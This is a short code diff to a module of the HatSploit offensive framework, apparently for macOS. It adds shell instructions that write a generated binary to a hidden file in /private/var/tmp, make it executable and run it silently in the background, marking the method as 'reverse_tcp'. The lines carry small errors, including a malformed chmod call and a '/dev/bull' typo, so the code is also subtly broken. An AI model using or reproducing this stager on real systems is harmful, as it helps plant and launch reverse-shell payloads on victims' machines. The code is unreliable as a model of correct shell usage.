@@ -81,4 +81,14 @@ class HatSploitPayload(HatSploitPayload):
         self.badges.output_process("Generating payload...")
         payload = self.payload.generate(executable_format, 'x64', shellcode)
 
+        instructions = ""
+        instructions += "cat >/private/var/tmp/.payload;"
+        instructions += "chmod +x 777 /private/var/tmp/.payload;"
+        instructions += "sh -c '/private/var/tmp/.payload' 2>/dev/bull &"
+        instructions += "\n"
+
+        self.method['Payload'] = payload
+        self.method['Instructions'] = instructions
+        self.method['Type'] = 'reverse_tcp'
+
         return payload
